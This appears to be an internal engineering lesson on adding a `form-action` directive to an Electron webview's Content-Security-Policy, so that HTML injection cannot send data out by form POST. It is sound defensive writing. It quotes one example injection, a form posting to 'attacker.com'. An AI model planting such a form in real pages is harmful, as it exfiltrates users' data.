## Context

The webview CSP policy in `getLocalhostDevCSP()` was missing a `form-action` directive. Without it, a browser's default allows form submissions to any origin, which can be exploited via HTML injection to exfiltrate data without JavaScript (`<form action="https://attacker.com">`).

## Problem

CSP `script-src` blocks JavaScript-based exfiltration, but form submissions bypass it entirely — `<form>` elements use navigation, not scripting. An HTML injection vulnerability (without XSS) in a dev server preview could leak sensitive data via form POST to an external origin.

## Root Cause

The `form-action` CSP directive is a separate, non-default-src directive. It is not covered by `default-src` fallback in older CSP specs, and adding `script-src` restrictions does not restrict form submissions. The directive must be added explicitly.

## Lesson

Always include `form-action` in webview/webContents CSP policies. The correct value for a localhost-only dev preview:

```
form-action 'self' http://localhost:* http://127.0.0.1:* ws://localhost:* ws://127.0.0.1:*
```

This restricts form submissions to the same origin and localhost — blocking external data exfiltration via form POST while preserving normal dev server interaction.

`form-action` is not covered by `default-src` fallback, so it must be listed explicitly in every CSP string where form submissions should be restricted.

Test both the positive case (directive present with correct allowed origins) and negative assertions (external origins not included) when writing CSP tests.

## Applies when

- Adding or updating any `Content-Security-Policy` string in the codebase
- Reviewing webview CSP policies in `electron/utils/webviewCsp.ts`
- Assessing HTML injection impact in contexts where JavaScript is blocked but HTML is not
